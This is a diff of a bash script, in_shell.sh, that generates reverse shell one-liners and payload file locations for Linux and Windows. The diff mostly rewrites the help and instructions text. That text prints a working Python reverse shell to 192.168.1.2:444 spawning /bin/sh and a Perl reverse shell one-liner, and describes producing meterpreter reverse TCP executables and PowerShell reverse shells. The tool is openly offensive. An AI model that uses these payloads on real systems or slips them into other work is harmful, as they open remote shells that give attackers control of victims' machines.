@@ -13,6 +13,10 @@ variabled=0
 readable=0
 del_s="#"
 
+scr_name=`basename "$0"`
+#scr_name="${0}"
+#scr_name="oneliner"
+echo $scr_name
 
 inv_style="\e[7m"
 rst_style="\e[0m"
@@ -37,22 +41,37 @@ Example :\n
 	\tin_shell.sh -i 192.168.1.2 -p 444 -A win -s cmd.exe -d# -q -f -r
 "
 
+example1="$scr_name -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4"
+example2="$scr_name -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4"
+example3="$scr_name -A win -i 4| grep powershell| cut -d# -f1,4 "
+example4="$scr_name -A win -i 4| grep powershell| cut -d# -f1,4- "
+example5="$scr_name -A win | grep perl |cut -d# -f4"
+
+#echo $(basename $(readlink -nf $0))
+#ex1_eval=$(eval bash $example1)
+#echo $ex1_eval
+#exit
 
 instructions="\n
 ==============================================================================\n
 Instructions\n
 Pipe this command with 'grep' and 'cut' to get reverse shell one-liners and payload file locations.\n
 Example:\n
-	\tTo get a python reverse shell one-liner for linux /bin/sh shell type:\n\n
-	$ in_shell.sh -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4\n
+	\t$b_u_style To get all python reverse shell one-liner for linux /bin/sh shell type: $rst_style\n
+	$ $scr_name -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4\n
 	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'\n\n
-	
-	\tTo get a meterpreter reverse TCP executable for windows type (it is a file so enable -f):\n\n
-	$ in_shell.sh -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4\n
+	\n
+	\t$b_u_style To get a meterpreter reverse TCP executable for windows type (it is a file so enable -f): $rst_style\n
+	$ $scr_name -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4 \n
 	/tmp/meterpreter\n\n
 
-	\tDefaults are also sane:\n\n
-	$ in_shell.sh -A win | grep perl |cut -d# -f4\n
+	\t$b_u_style To get all powershell reverse shell one-liners numbered type: $rst_style\n
+	$ $scr_name -A win -i 4| grep powershell| cut -d# -f1,4- \n
+	[ ...output trimmed... try it yourself! ] \n
+	\n
+
+	\t$b_u_style Defaults are also sane$rst_style:\n
+	$ $scr_name -A win | grep perl |cut -d# -f4\n
 	perl -MIO::Socket -e '\$c=new IO::Socket::INET(PeerAddr => \"$default_ip:$default_port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'\n\n
 \n
 ==============================================================================
@@ -84,7 +103,7 @@ while getopts "i:p:A:s:d:hqfr" arg; do
 		A)	plat=$OPTARG;;
 		s)	shell=$OPTARG;;
 		d)	del_s=$OPTARG;;
-		h)	echo $help_str ;	echo $instructions ;exit;;
+		h)	echo -e $help_str ;	echo -e $instructions ;exit;;
 		q)	quiet=1;;
 		f)	filemake=1;;
 		r)	readable=1;;
@@ -112,9 +131,9 @@ py_var="sys.argv[x]"
 rb_var="ARGV[x]"	# add +1 here
 pl_var="\$ARGV[x]"	# add +1 here
 
-
-s_folder="templates/"
-f_folder="files/"
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+s_folder="$DIR/templates/"
+f_folder="$DIR/files/"
 
 scripts=$(ls $s_folder | grep $plat)
 files=$(ls $f_folder | grep $plat)
